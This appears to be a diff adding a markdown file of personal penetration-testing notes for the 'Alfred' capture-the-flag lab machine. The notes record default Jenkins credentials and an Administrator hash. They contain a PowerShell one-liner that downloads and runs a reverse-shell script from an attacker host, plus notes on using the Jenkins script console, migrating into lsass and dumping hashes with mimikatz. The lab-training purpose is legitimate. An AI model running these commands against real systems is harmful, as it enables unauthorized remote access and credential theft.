@@ -1,0 +1,53 @@
+# Alfred
+
+OS: Alfred
+
+Web-Technology: 
+
+Hostname: 
+
+IP: 10.10.200.206
+
+Credentials: 
+
+bruce
+
+**alfred@wayneenterprises.com**
+
+admin:admin ←- jeknins login
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+================================================================To-Try List
+
+*powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.1.112:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -10.2.1.112 -Port 5560*
+
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
+Alternatively, WE can use the build console to run a windows command within the build window. 
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/97aa781b-36b2-47b4-97fb-b0cd7668af50/Untitled.png)
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/ee92cc63-8a7f-4f0c-9ca3-0f3ed7bc6b3c/Untitled.png)
+
+================================================================
+
+NMAP Resuslts 
+
+80 - Basic page that gave away email naming scheme and user login. 
+
+8080 - Jenkins login page - used admin:admin to login
+
+3389
+
+================================================================
+
+Web-Service Escalation
+
+utilized jenkins to generate rev-shell through script console in jenkins. from rev-shell. migrated to lsass process and then used mimikatz to get hashes. 
+
+================================================================
+
+Other / PRiviledge Escalaiton
+
+=============================================================
